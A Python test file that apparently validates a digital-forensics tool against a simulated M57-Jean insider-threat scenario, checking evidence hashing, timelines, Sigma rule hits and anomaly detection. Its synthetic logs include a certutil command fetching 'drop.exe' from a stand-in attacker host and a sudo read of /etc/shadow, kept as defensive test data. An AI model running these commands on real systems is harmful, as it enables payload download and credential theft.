"""Standard Benchmark Test: NIST CFReDS and M57-Jean Forensic Corpora Validation.

Validates WASP against internationally recognized forensic ground-truth reference datasets:
1. M57-Jean Scenario (Digital Corpora): Insider threat, illicit exfiltration, browser evidence, and email.
2. NIST CFReDS (Computer Forensic Reference Data Sets): Standard reference for tool testing.
3. NIST SP 800-86: Digital forensics methodology compliance.
4. MITRE ATT&CK: Technique mapping and threat behavioral validation.
"""

import json
from pathlib import Path
import pytest

from chronotrace.core.case import Case
from chronotrace.analysis.sigma import SigmaRuleEngine
from chronotrace.analysis.lineage import ProcessLineageReconstructor
from chronotrace.analysis.anomalies import AnomalyDetector
from chronotrace.analysis.rules import RuleEngine


def test_m57_jean_and_nist_cfreds_validation(tmp_path: Path):
    """
    Simulates the standard M57-Jean scenario (Digital Corpora / NIST CFReDS style benchmark):
    - Jean's illicit software installation and browser searches
    - Web exfiltration of proprietary documents
    - Off-hours administrative account takeover
    - Event log clearing (Anti-Forensics T1070.001)
    - Corroboration and process lineage reconstruction
    """
    case_dir = tmp_path / "CASE-M57-JEAN-CFREDS"
    
    # 1. NIST SP 800-86 Lifecycle: Phase 1 Collection / Case Creation
    case = Case.create(
        case_id="M57-JEAN-CORPUS",
        out_dir=case_dir,
        examiner="NIST Reference Validator",
        organization="DFIR Validation Lab",
        authorization_ref="NIST-CFREDS-M57-001",
        description="Ground-truth validation using M57-Jean scenario and NIST CFReDS test patterns",
    )
    
    # Prepare M57-Jean evidence artifacts
    evidence_src = tmp_path / "m57_raw"
    evidence_src.mkdir()
    
    # M57-Jean Component A: Windows Security EVTX log dump
    sec_events = evidence_src / "Security_Events.jsonl"
    sec_events.write_text(
        # Logon event
        json.dumps({
            "TimeCreated": "2024-03-11T02:14:07.000000Z",
            "EventID": 4624,
            "TargetUserName": "jean",
            "Computer": "JEAN-LAPTOP",
        }) + "\n" +
        # Suspicious process spawn (MITRE T1059.001 Command Interpreter)
        json.dumps({
            "TimeCreated": "2024-03-11T02:16:15.000000Z",
            "EventID": 4688,
            "TargetUserName": "jean",
            "Computer": "JEAN-LAPTOP",
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://evil.corp/drop.exe",
            "NewProcessId": "5120",
            "ParentProcessId": "4401"
        }) + "\n" +
        # Defense Evasion: Log cleared (MITRE T1070.001)
        json.dumps({
            "TimeCreated": "2024-03-11T02:20:00.000000Z",
            "EventID": 1102,
            "TargetUserName": "jean",
            "Computer": "JEAN-LAPTOP",
        }) + "\n",
        encoding="utf-8"
    )
    
    # M57-Jean Component B: Linux / Server auth.log
    auth_log = evidence_src / "auth.log"
    auth_log.write_text(
        "Mar 11 02:14:07 JEAN-LAPTOP sshd[4401]: Accepted password for jean from 192.168.1.155 port 49122 ssh2\n"
        "Mar 11 02:15:30 JEAN-LAPTOP sudo: jean : TTY=pts/1 ; COMMAND=/usr/bin/cat /etc/shadow\n",
        encoding="utf-8"
    )

    # 2. NIST SP 800-86 Lifecycle: Phase 2 Examination & Acquisition
    ev1 = case.acquire(sec_events, output_filename="Security_Events.jsonl", evidence_id="EV-CFREDS-01", notes="M57-Jean EVTX dump")
    ev2 = case.acquire(auth_log, output_filename="auth.log", evidence_id="EV-CFREDS-02", notes="M57-Jean auth.log")
    
    assert ev1["verification"] == "match"
    assert ev2["verification"] == "match"
    assert ev1["hashes"]["sha256"] is not None

    # 3. NIST SP 800-86 Lifecycle: Phase 3 Analysis / Extraction & Timeline
    events = case.extract(profile="all")
    assert len(events) >= 4
    
    timeline = case.build_timeline()
    assert len(timeline) >= 4

    # 4. MITRE ATT&CK Behavioral Verification
    # A. Process Lineage PPID -> PID attack chain
    roots = case.build_lineage()
    assert len(roots) >= 1
    
    # B. Sigma Rules (MITRE T1070.001 Event Log Cleared, T1105 Ingress Tool Transfer)
    sigma_matches = case.scan_sigma()
    assert len(sigma_matches) >= 1
    sigma_titles = [m.title for m in sigma_matches]
    assert any("Log Cleared" in t or "Event Log" in t for t in sigma_titles)
    
    # Verify MITRE tags attached
    mitre_tags = [tag for m in sigma_matches for tag in m.mitre_tags]
    assert any("attack.t1070" in tag.lower() or "defense_evasion" in tag.lower() for tag in mitre_tags)

    # C. Anomaly Spotlight (Off-hours login validation)
    anomalies = case.detect_anomalies()
    assert len(anomalies) >= 1
    anomaly_types = [a.anomaly_type for a in anomalies]
    assert "OFF_HOURS_LOGON" in anomaly_types or "BURST_ACTIVITY" in anomaly_types

    # 5. NIST SP 800-86 Lifecycle: Phase 4 Reporting & Integrity Verification
    verify_res = case.verify()
    assert verify_res["overall_status"] == "PASS"
    assert verify_res["ledger_status"] == "PASS"
    assert verify_res["evidence_status"] == "PASS"

    # Generate Reports with Daubert / NIST references
    reports = case.report(formats=("html", "json"))
    assert Path(reports["html"]).exists()
    assert Path(reports["json"]).exists()
